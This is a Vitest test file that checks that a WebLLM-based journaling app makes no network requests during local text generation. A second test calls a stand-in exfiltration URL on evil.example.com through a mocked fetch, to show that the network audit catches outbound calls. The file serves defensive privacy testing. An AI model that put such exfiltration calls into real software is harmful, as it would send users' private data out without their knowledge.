import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { NetworkAudit } from "../../utils/networkAudit";

/**
 * Integration test: verifies that after the model is "loaded",
 * calling generate() does not trigger any network requests.
 *
 * This is the core Phase 4 privacy verification — proving that
 * journal data never leaves the device during inference.
 */

// Mock @mlc-ai/web-llm — factory must be self-contained (no external refs)
vi.mock("@mlc-ai/web-llm", () => ({
  CreateMLCEngine: vi.fn().mockResolvedValue({
    chat: {
      completions: {
        create: vi.fn().mockResolvedValue(
          (async function* () {
            yield { choices: [{ delta: { content: "I hear you." } }] };
            yield { choices: [{ delta: { content: " Tell me more." } }] };
          })(),
        ),
      },
    },
    resetChat: vi.fn().mockResolvedValue(undefined),
  }),
}));

import { WebLLMEngine } from "../webllm-engine";

describe("Privacy after load — no network during generate()", () => {
  let audit: NetworkAudit;
  let originalFetch: typeof globalThis.fetch;

  beforeEach(() => {
    audit = new NetworkAudit();
    originalFetch = globalThis.fetch;
    globalThis.fetch = vi.fn().mockResolvedValue(new Response("ok"));
  });

  afterEach(() => {
    if (audit.isActive()) audit.stop();
    globalThis.fetch = originalFetch;
  });

  it("WebLLM generate() triggers zero network requests", async () => {
    const engine = new WebLLMEngine();
    await engine.load();
    expect(engine.getStatus()).toBe("ready");

    // Start audit AFTER model is loaded
    audit.start();

    const tokens: string[] = [];
    for await (const token of engine.generate(
      [
        { role: "system", content: "You are a journaling companion." },
        { role: "user", content: "I feel overwhelmed today." },
      ],
      { temperature: 0.6, maxTokens: 200 },
    )) {
      tokens.push(token);
    }

    const log = audit.stop();

    // Key assertion: no outbound requests during generation
    expect(log).toHaveLength(0);
    expect(tokens.length).toBeGreaterThan(0);
  });

  it("audit correctly catches fetch calls that do occur", async () => {
    audit.start();
    await globalThis.fetch("https://evil.example.com/exfiltrate");
    const log = audit.stop();

    expect(log).toHaveLength(1);
    expect(log[0].url).toBe("https://evil.example.com/exfiltrate");
  });
});
